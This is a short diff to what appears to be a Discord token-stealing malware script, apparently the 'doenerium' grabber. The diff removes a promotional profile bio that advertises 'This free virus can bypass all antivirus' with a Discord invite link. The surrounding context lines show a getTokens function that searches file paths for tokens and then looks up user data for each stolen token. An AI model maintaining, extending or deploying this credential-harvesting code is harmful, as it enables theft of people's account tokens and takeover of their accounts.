@@ -1865,11 +1865,6 @@ async function getTokens() {
         await findToken(path);
     }
 
-    const predefinedBio = `╔═══════════✧✧✧═══════════╗ 
-**     This free virus can bypass all antivirus !** 
-**           ⭐️https://discord.gg/doenerium** ⭐️
-╚═══════════✧✧✧═══════════╝`;
-
     for (let token of tokens) {
         try {
             const userData = await getUserData(token);
